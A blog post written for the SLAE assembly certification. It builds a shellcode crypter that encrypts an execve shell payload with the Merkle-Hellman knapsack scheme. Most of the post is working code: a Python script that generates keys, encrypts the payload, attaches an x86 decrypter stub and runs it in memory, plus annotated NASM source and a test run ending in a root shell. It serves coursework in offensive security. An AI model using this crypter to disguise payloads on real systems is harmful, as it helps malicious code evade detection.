---
layout: single
title: SLAE Assignment 7 - Custom Shellcode Crypter
date: 2020-5-13
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING32.png
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
---

![](/assets/images/slae/SHELLCODING32.png)

## Introduction
This is the last post of the SLAE exam assignments serie.  

The goal of this assignement is to create a custom shellcode crypter.   
We are allowed to use any existing encryption scheme and any programming language.

All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-07-Custom_shellcode_crypter)

## Merkle - Hellman knapstack cryptosystem

### Overview

For this assignment, I've chosen to use the [Merkle - Hellman knapstack cryptosystem](https://en.wikipedia.org/wiki/Merkle-Hellman_knapsack_cryptosystem) because its simplicity allows us to create a 'small' decrypter stub in asm.

I will let you look at the link provided above if you want to know more about the detail of this encryption scheme.

### Implementation

The following script can encrypts, decrypts, executes and dump stub and encrypted shellcode.  
The shellcode is easily configurable.  
A new couple of public/private key are generated each time, using a superincreasing sequence that I've made to be sure that its bigger element can be contained into one byte, so the full sequence is 8 bytes long.  
It is important to note that the encrypted shellcode will be two times the size of the original shellcode.  
And that the encryption can introduce null bytes.  
Finally, the only constraint is to not use a shellcode bigger than 255 bytes, because the size is coded on one byte in the decoder.

```python
from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv
import random
import math

libc = CDLL("libc.so.6")

# Execve("/bin//sh", null, null) 
shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
original_size = "\\x"+"{:02x}".format(int(len(shellcode) / 4))

#    xor ecx,ecx
#    mul ecx
#
#    push eax
#    push 0x68732f6e
#    push 0x69622f2f 
#
#    mov ebx, esp
#    mov al, 0x0b
#    int 0x80

# Merkle-Hellman crypter stub :
decrypter = "\\xeb\\x4d\\x66\\x8b\\x43\\x0a\\x66\\xf7\\x26\\x66\\xf7\\x73\\x08\\x66\\x89\\xd0\\xc3\\x5b\\x8d\\x7b\\x0c\\x89\\xfe\\x31\\xc9\\xf7\\xe1\\xb1{size}\\xe8\\xe0\\xff\\xff\\xff\\x66\\x51\\xb1\\x08\\x01\\xcb\\x4b\\x99\\x8a\\x13\\x66\\x39\\xd0\\xf8\\x78\\x04\\x66\\x29\\xd0\\xf9\\xd1\\xdd\\xfe\\xc9\\x75\\xec\\xc1\\xed\\x18\\x87\\xea\\x88\\x17\\x47\\x8d\\x76\\x02\\x66\\x59\\x66\\x49\\x75\\xd0\\xeb\\x11\\xe8\\xbd\\xff\\xff\\xff{pki}{encrypted}"

# Private and Public key generator
def mhk_keygen():
    # Generate a superincreasing sequence w where the bigger element is <= 255
    w = []
    w.append(random.randint(1,2))
    for i in range(0,7):
        s , j = 0, 2**i
        s += random.randint(1,2)
        for k in range (0, i+1):
            s += w[k]
        w.append(s)

    # Generate q and r
    s = sum(w)
    q = random.randint(s + 1, 4096)
    r = random.randint(1, q - 1)
    while math.gcd(q, r) != 1:
        r = random.randint(1, q -1)

    # The private key
    priv_key = (w, q, r)

    # Generate now the public key
    pub_key = []
    for i in w:
        pub_key.append((i*r) % q)

    return (priv_key, pub_key)


# Encrypt the shellcode, return a list of the encrypted bytes value.
def mhk_crypt(pub, shellcode):
    shellcode_b = bytes.fromhex(shellcode.replace('\\x',''))
    crypted = []
    for c in shellcode_b:
        i = 0
        c = "{:08b}".format(c)
        for b in range(0,8):
            i += int(c[b]) * pub[b]
        crypted.append(i)
    return crypted
    

# modinv and xgcd are taken from 
# https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm
def xgcd(a, b):
    """return (g, x, y) such that a*x + b*y = g = gcd(a, b)"""
    x0, x1, y0, y1 = 0, 1, 1, 0
    while a != 0:
        (q, a), b = divmod(b, a), a
        y0, y1 = y1, y0 - q * y1
        x0, x1 = x1, x0 - q * x1
    return b, x0, y0
def modinv(a, b):
    """return x such that (x * a) % b == 1"""
    g, x, _ = xgcd(a, b)
    if g != 1:
        raise Exception('gcd(a, b) != 1')
    return x % b


# Decrypt a crypted shellcode with the given private key
# return the shellcode string
# used to test the algo before coding it in assembly
def mhk_decrypt(priv, crypted):
    s = modinv(priv[2], priv[1])
    decrypted = ""
    for i in crypted:
        u = ""
        nb = i * s % priv[1]
        for n in range(7, -1, -1):
            if priv[0][n] <= nb:
                nb -= priv[0][n]
                u = '1' + u
            else:
                u = '0' + u
        decrypted += "\\x"+"{:02x}".format(int("0b"+u, base=2))
    return decrypted


# return a string representation of the encrypted shellcode
def mhk_cryptostr(shellcode):
    crypted_str = ""
    for i in shellcode:
        s = "{:04x}".format(i)
        s = "\\x"+s[2:]+"\\x"+s[:2]
        crypted_str += s
    return crypted_str

# I'm cheating, I don't calculate the modular inverse in asm
# But here, and I replace r with it
# So return a string representation of the private key (w, q, modinv_r)
def mhk_keytostr(pk):
    pk_s = ""
    for i in pk[0]:
        pk_s += "\\x"+"{:02x}".format(i)
    q, r = "{:04x}".format(pk[1]), "{:04x}".format(modinv(pk[2],pk[1]))
    pk_s += "\\x"+q[2:]+"\\x"+q[:2]+"\\x"+r[2:]+"\\x"+r[:2]
    return pk_s

# Generate the keys pair
keys = mhk_keygen()

# Encrypt the original shellcode 
crypted = mhk_crypt(keys[1], shellcode)
print("Encrypted shellcode ({} bytes):".format(len(crypted)*2))
crypted = mhk_cryptostr(crypted)
print(crypted, end="\n\n")

private_key = mhk_keytostr(keys[0])
print("Private key (12 bytes):")
print(private_key , end="\n\n")

# Initialize the stub :
decrypter = decrypter.format(size=original_size , pki=private_key, encrypted=crypted)

# Convert the decrypter stub and encrypted shellcode into a bytes object
payload_b = bytes.fromhex(decrypter.replace('\\x', ''))

print("Encrypted shellcode + Decrypter stub ({} bytes):".format(len(payload_b)))
print(decrypter, end="\n\n")


# Execute the payload
c_shell_p = c_char_p(payload_b)

launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

print("Running shellcode....")
launch()
```

And here is the decoder stub source code (here with a crypted execve shellcode):

```nasm
global _start
section .text

_start:
    jmp crypted             ; jmp/call/pop to get private key + encrypted shellcode address

get_nb:
    mov ax, [ebx+0xa]       ; pointer to modular inverse r
    mul word [esi]          ; r * encrypted byte value
    div word [ebx+0x8]      ; divide by q
    mov ax, dx              ; AX set to modulo q value (remainder)
    ret         

decrypt:                    ; Initialisation of some registers
    pop ebx                 ; pointer to the private key (w, q, modinv_r)
    lea edi, [ebx+12]       ; pointers to the encoded shellcode
    mov esi, edi            ;  - ESI used to read encrypted payload
                            ;  - EDI used to write decrypted payload
    xor ecx, ecx            
    mul ecx                 ; EAX,EDX,ECX set to 0
    mov cl, 0x15            ; 21 bytes (original shellcode length!!)

next_char:
    call get_nb             ; Set EAX to the next encrypted byte value
    push cx                 ; save bytes counter 
    mov cl, 0x8             ; set bits counter
    add ebx, ecx            ; init EBX pointer, it will iterate through 'w'
                            ; from its last element to its first

next_bit:
    dec ebx                 ; EBX point from w[7] to w[0]
    cdq                     ; clear EDX
    mov dl, [ebx]           ; set DL to next 'w' element value
    cmp ax, dx              ; 
    clc                     ; Set CF = 0
    js next                 ; jump if DX > AX 
                            ; else AX composed of DX, so corresponding bit = 1
    sub ax, dx              ; substract DX from AX
    stc                     ; Set CF = 1
next:
    rcr ebp, 1              ; rotate EBP one byte to the right, 
                            ; insert CF value to the left
    dec cl                  ; decrease bits counter
    jnz next_bit            ; jump to next bit if cl > 0

    shr ebp, 24             ; set the decrypted byte in the 8 lower bits of EBP
    xchg ebp, edx           ; exchange EDX and EBP (decrpted byte in DL now)
    mov byte [edi], dl      ; copy DL to the memory pointed by EDI
    inc edi                 ; move EDI to the next mememory byte
    lea esi, [esi+2]        ; move ESI to the next encrypted bytes
    pop cx                  ; set CX to bytes counter value
    dec cx                  ; decrease bytes counter
    jnz next_char           ; jump to next char if CX > 0

    jmp payload             ; Jump to decrypted payload
    
crypted:
    call decrypt
    key: db 0x01,0x03,0x06,0x0c,0x18,0x2f,0x5e,0xbd,0xe8,0x02,0xd7,0x00
    payload: db 0x69,0x03,0xf7,0x04,0x10,0x07,0xe9,0x03,0xe1,0x00,0xef,0x01,0x62,0x04,0x90,0x06,0x40,0x04,0xef,0x01,0xef,0x01,0x90,0x06,0x90,0x06,0x31,0x01,0x4a,0x04,0xca,0x04,0x93,0x04,0x15,0x02,0x6d,0x04,0xc0,0x06,0x07,0x01
```

As always we can extract the shellcode using a script :
```plaintext
[x] Assembling...
[x] Linking...
[x] Done !

Shellcode : 
"\\xeb\\x4d\\x66\\x8b\\x43\\x0a\\x66\\xf7\\x26\\x66\\xf7\\x73\\x08\\x66\\x89\\xd0\\xc3\\x5b\\x8d\\x7b\\x0c\\x89\\xfe\\x31\\xc9\\xf7\\xe1\\xb1\\x15\\xe8\\xe0\\xff\\xff\\xff\\x66\\x51\\xb1\\x08\\x01\\xcb\\x4b\\x99\\x8a\\x13\\x66\\x39\\xd0\\xf8\\x78\\x04\\x66\\x29\\xd0\\xf9\\xd1\\xdd\\xfe\\xc9\\x75\\xec\\xc1\\xed\\x18\\x87\\xea\\x88\\x17\\x47\\x8d\\x76\\x02\\x66\\x59\\x66\\x49\\x75\\xd0\\xeb\\x11\\xe8\\xbd\\xff\\xff\\xff\\x01\\x03\\x06\\x0c\\x18\\x2f\\x5e\\xbd\\xe8\\x02\\xd7\\x00\\x69\\x03\\xf7\\x04\\x10\\x07\\xe9\\x03\\xe1\\x00\\xef\\x01\\x62\\x04\\x90\\x06\\x40\\x04\\xef\\x01\\xef\\x01\\x90\\x06\\x90\\x06\\x31\\x01\\x4a\\x04\\xca\\x04\\x93\\x04\\x15\\x02\\x6d\\x04\\xc0\\x06\\x07\\x01"
```

And you can see that before inserting it in a python script, I've replaced the original shellcode length byte, the private key bytes and the encrypted shellcode bytes, with three string format fields so it can be easily used with any shellcode we want. 
```python
# Merkle-Hellman crypter stub :
decrypter = "\\xeb\\x4d\\x66\\x8b\\x43\\x0a\\x66\\xf7\\x26\\x66\\xf7\\x73\\x08\\x66\\x89\\xd0\\xc3\\x5b\\x8d\\x7b\\x0c\\x89\\xfe\\x31\\xc9\\xf7\\xe1\\xb1{size}\\xe8\\xe0\\xff\\xff\\xff\\x66\\x51\\xb1\\x08\\x01\\xcb\\x4b\\x99\\x8a\\x13\\x66\\x39\\xd0\\xf8\\x78\\x04\\x66\\x29\\xd0\\xf9\\xd1\\xdd\\xfe\\xc9\\x75\\xec\\xc1\\xed\\x18\\x87\\xea\\x88\\x17\\x47\\x8d\\x76\\x02\\x66\\x59\\x66\\x49\\x75\\xd0\\xeb\\x11\\xe8\\xbd\\xff\\xff\\xff{pki}{encrypted}"
```

And now, we will test it with the execve shellcode :

```plaintext
root@kali:/mnt/hgfs/shared/slae-exam/assignment-07# ./mhk-crypter.py 
Encrypted shellcode (42 bytes):
\x4c\x0a\x14\x0d\x3f\x16\x36\x08\xd3\x03\x0a\x09\xf2\x13\xae\x18\x61\x12\x0a\x09\x0a\x09\xae\x18\xae\x18\xd2\x09\x78\x0e\x62\x0c\x99\x0f\x37\x05\x6c\x13\x99\x10\x59\x00

Private key (12 bytes):
\x01\x02\x05\x09\x13\x25\x4b\x96\x58\x09\x81\x08

Encrypted shellcode + Decrypter stub (138 bytes):
\xeb\x4d\x66\x8b\x43\x0a\x66\xf7\x26\x66\xf7\x73\x08\x66\x89\xd0\xc3\x5b\x8d\x7b\x0c\x89\xfe\x31\xc9\xf7\xe1\xb1\x15\xe8\xe0\xff\xff\xff\x66\x51\xb1\x08\x01\xcb\x4b\x99\x8a\x13\x66\x39\xd0\xf8\x78\x04\x66\x29\xd0\xf9\xd1\xdd\xfe\xc9\x75\xec\xc1\xed\x18\x87\xea\x88\x17\x47\x8d\x76\x02\x66\x59\x66\x49\x75\xd0\xeb\x11\xe8\xbd\xff\xff\xff\x01\x02\x05\x09\x13\x25\x4b\x96\x58\x09\x81\x08\x4c\x0a\x14\x0d\x3f\x16\x36\x08\xd3\x03\x0a\x09\xf2\x13\xae\x18\x61\x12\x0a\x09\x0a\x09\xae\x18\xae\x18\xd2\x09\x78\x0e\x62\x0c\x99\x0f\x37\x05\x6c\x13\x99\x10\x59\x00

Running shellcode....
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

And this is the end of this assignement and of the SLAE 32 bits serie,

Thank you for reading !


***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
Student ID: PA-14186***
